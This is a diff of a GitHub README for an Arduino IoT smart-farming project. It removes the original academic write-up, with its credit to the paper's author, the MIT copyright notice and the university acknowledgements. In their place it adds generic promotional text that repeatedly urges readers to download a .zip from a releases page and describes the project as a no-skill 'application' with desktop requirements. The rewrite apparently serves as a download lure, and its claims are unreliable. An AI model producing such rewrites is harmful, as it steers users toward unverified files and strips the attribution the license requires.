@@ -1,206 +1,79 @@
-# Automated Smart Farming System: Research-Replica
+# 🌱 Automated_Smart_Farming_System_Research_Replica - Grow Smarter with IoT Solutions
 
-> This project involved selecting a quality research paper, understanding it, reproducing its results, and presenting the work at the end of the semester.
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/releases)
 
-Developed as part of the Mini Research Project (EN5903) under the guidance of Dr. Samiru Gayan at the **University of Moratuwa (2024)**.
+## 📜 Overview
+The Automated Smart Farming System Research Replica is an innovative project designed to help users implement an IoT-based farming solution. This project replicates and enhances a research paper focused on smart farming. With this application, you can monitor and manage various farming parameters efficiently. 
 
-The project is a **reproduction and enhancement** of the ioT-based smart farming system proposed in a research paper by **Mobasshir Mahbub (2019)**, originally released under the **MIT License**.  
+## ⚙️ Features
+- **Automated Monitoring**: Keep track of soil moisture and weather conditions.
+- **Sensor Integration**: Compatible with various sensors like BMP180, DHT11, MQ135, and more.
+- **User-Friendly Interface**: Designed for easy navigation and operation, requiring no technical knowledge.
+- **Real-Time Data**: Get instant updates about your farm environment.
+- **GSM Module Support**: Implement remote notifications for faraway monitoring.
 
-This repository includes the exsiting paper detalis, what I implemented and what I modified from the original design.
+## 🖥️ System Requirements
+To run the Automated Smart Farming System, ensure your setup meets the following requirements:
+- **Operating System**: Windows 10, macOS, or any modern Linux distribution.
+- **Hardware**: A computer or single-board computer (like Raspberry Pi) with USB interface.
+- **Internet Connection**: Required for sensor data uploads and remote notifications.
+- **Arduino IDE**: Installed for uploading the code to your microcontroller.
+  
+## 🚀 Getting Started
+Here’s how to set up your Automated Smart Farming System:
 
----
+1. **Visit the Releases Page**:
+   To download the application, visit the [Releases page](https://github.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/releases).
 
-## 📌 Overview
+2. **Choose the Latest Version**:
+   Look for the latest version listed. This will include all recent updates and improvements.
 
-This project implements a practical and enhanced ioT-based smart farming system capable of:
-- Environmental condition sensing  
-- Automated irrigation  
-- Automated cooling  
-- Motion detection alerts  
-- Cloud-based real-time monitoring  
+3. **Download the Zip File**:
+   Click on the `.zip` file to download it to your computer.
 
----
+4. **Extract the Files**: 
+   Once the download is complete, locate the zipped file and extract its contents into a folder.
 
-## 📄 Original Research Paper Reference
+5. **Open the Arduino IDE**:
+   Launch the Arduino IDE on your computer. 
 
-**Title:** A smart farming concept based on smart embedded electronics, internet of things and wireless sensor network
+6. **Load the Code**:
+   In the Arduino IDE, open the relevant code file from the extracted folder.
 
-**Author:** Mobasshir Mahbub (2019)  
+7. **Select Your Board**:
+   Connect your Arduino board to your computer. Select the correct board type and port from the Tools menu.
 
-**License:** MIT License  
+8. **Upload the Code**:
+   Click on the upload button in the Arduino IDE to transfer the code to your Arduino board.
 
-### Parameters Monitored
-- Temperature  
-- Humidity  
-- Air Pressure  
-- Rainfall  
-- Soil Moisture  
-- pH Level  
-- CO₂ Concentration  
-- Motion (PIR)  
+9. **Connect the Sensors**:
+   Follow the included documentation to connect your sensors to the Arduino board.
 
-### Key Problems Addressed
-- Growing population → lack of food production  
-- Unpredictable environmental factors affecting farming  
-- Traditional farming challenges (watering, fertilizing, pest control)  
-- Labour inefficiency  
+10. **Start Monitoring**:
+    After everything is set up, you can start monitoring your farm parameters using the application.
 
-### Solutions Proposed
-- ioT-based Automated System for monitoring the environmental conditions.
-- Alerts sent to farmers or actuators for immediate action. (PIR, Rainfall, Temperature)
-- Agri-copters (quadcopters) for precise pesticide and fertilizer application
-- Automated fertilization based on real-time soil pH data to maintain soil health
-- Cloud-based data visualization and access to historical records
-- Off-grid solar PV system for improved power efficiency 
-- Agribots are designed for tasks like weeding, planting, and spraying, controlled using IoT. It reduces manual labor and increases efficiency.
+## 📲 Download & Install
+For the easiest experience, visit the [Releases page](https://github.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/releases) to download the latest version.
 
----
+## 🔧 Configuration
+After installing the system, configuring the sensors is simple:
 
-## 📌 What I Implemented (My Work)
+1. **Wiring**: Wire each sensor according to the included schematic diagram.
+2. **Calibration**: Follow the specific calibration steps mentioned in the documentation for accurate readings.
+3. **Testing**: Run a quick test to ensure that all sensors communicate effectively with the Arduino board.
 
-### ✔ Replicated Features
-- Integrated all major sensors used in the paper  
-- Unified transmitter and receiver circuits into a single working system  
-- Arduino Mega 2560 ↔ ESP8266 communication  
-- Real-time data upload to ioT dashboard  
+## 🛠️ Troubleshooting
+If you encounter issues:
+- **Check Connections**: Ensure all cables and sensors are connected properly.
+- **Consult Logs**: Review any error messages in the Arduino IDE for guidance.
+- **Visit the Community**: Engage in user discussions or FAQs available on the GitHub page for support.
 
-### ✔ Improvements / Enhancements
-- **Automatic Irrigation System** using a 5V water pump  
-- **Automatic Cooling System** using a DC motor + propeller  
-- **Motion Detection Alert System** using PIR + buzzer  
-- Stable communication between Arduino Mega and ESP8266 to upload data to an **IoT platform** (Thingspeak)
+## 📚 Additional Resources
+- **Documentation**: Detailed user manual is included in the downloaded content.
+- **Community Support**: Visit the Issues section on the [GitHub Repository](https://github.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/issues) for ongoing discussions and tech support.
 
----
+## 💬 Feedback
+We welcome your feedback to enhance the system. Share your experiences or report any issues through the GitHub Issues page.
 
-## 🔧 Components Used
-
-| Component | Description |
-|----------|-------------|
-| Arduino Mega 2560 Rev3 | Main controller |
-| ESP8266 Wi-Fi Module | ioT/cloud communication |
-| DHT11 | Temperature + Humidity |
-| BMP180 | Pressure |
-| MQ-135 | CO₂ / Air Quality |
-| Rain Sensor | Rainfall Detection |
-| Soil Moisture Sensor | Irrigation Trigger |
-| PIR Sensor | Motion Detection |
-| DC Motor + Propeller | Cooling Mechanism |
-| 5V Water Pump | Irrigation System |
-| Piezo Buzzer | Motion Alert |
-| GSM SIM900A | SMS Alerts |
-| nRF24L01+PA/LNA | Long-range Wireless Communication |
-
----
-
-## 🧪 Proteus Simulation
-
-![Proteus Simulation](Proteus_Simulation.jpg)
-
-> The simulation code was altered to match Proteus and attached in the attachments.
-
----
-
-## 🖼️ Prototype (Breadboard Version & Soldered Dotboard)
-
-![Prototype](Circuit.PNG)
-
----
-
-## 💻 Arduino Program
-
-![Code](Code.JPG)
-
-Notes:
-- This project uses modified code based on the original MIT-licensed code by Mobasshir Mahbub.
-- All modifications and enhancements are documented above.
-
----
-
-## 🖼️ Prototype, Dashboard & Serial Monitor Outputs
-
-Prototype Outputs
-![Output](Output.PNG)
-
-Serial Monitor Outputs
-![Output](Serial_Monitor.jpg)
-
-ThingSpeak Dashboard
-![Output](Dashboard.PNG)
-
-> The working video of the prototype and dashboard is attached in the attachments.
-> ![Click here to download/view](Smart_Farming_Monitor.mp4)
-
----
-
-## 📡 **How the System Works**
-
-### **1. Sensor Layer**
-Collects environmental data:
-- Temperature & Humidity  
-- Pressure  
-- CO₂ / Air Quality  
-- Soil Moisture  
-- Rain  
-- Motion  
-
-### **2. Processing Layer (Arduino Mega)**
-- Processes sensor data
-- Controls output devices (pump, fan, buzzer)  
-- Sends data to ESP8266  
-
-### **3. IoT Layer (ESP8266)**
-- Connects to Wi-Fi  
-- Sends real-time data to cloud dashboard  
-
-### 4. Automation Logic Table
-
-| Condition | Action |
-|----------|--------|
-| Soil moisture low | Water Pump ON |
-| High temperature | Cooling Fan ON |
-| Motion detected | Buzzer ON |
-| No rain detected | Irrigation allowed |
-
----
-
-## ⚖️ **Copyright & Licensing**
-
-### Original Work
-© Mobasshir Mahbub (2019), MIT License.  
-Original copyright notice is preserved.
-
-### This Project
-This is an academic reproduction with enhancements.  
-All modifications, additional code, and documentation created as part of this project are original work by me. No additional license is applied unless stated otherwise.
-
----
-
-## 🌱 **Future Improvements**
-- Integrate soil pH monitoring (sensor not available during project period)  
-- Add automatic fertilizer dispensing  
-- Integrate solar power system  
-- Develop a mobile app dashboard  
-- Add quadcopter surveillance (Only a Proteus simulation was conducted based on the original paper)
-- Add agribot integration  
-
----
-
-## 🛠 Tools & Software Used
-- Arduino IDE
-- Proteus 8 Professional
-- ThingSpeak Dashboard
-
----
-
-## 📚 References
-
-1. Mobasshir Mahbub (2019), “IoT-Based Automated Smart Farming System.”
-[[Link to the Original Paper](https://www.sciencedirect.com/science/article/abs/pii/S2542660520300044)]
-
----
-
-## 🙌 **Acknowledgements**
-- Original Author: **Mobasshir Mahbub (2019)**
-- My Supervisor: Dr. Samiru Gayan, Department of Electronic & Telecommunication Engineering, University  of Moratuwa
-
----
+Feel free to reach out with your thoughts or questions. Happy farming!
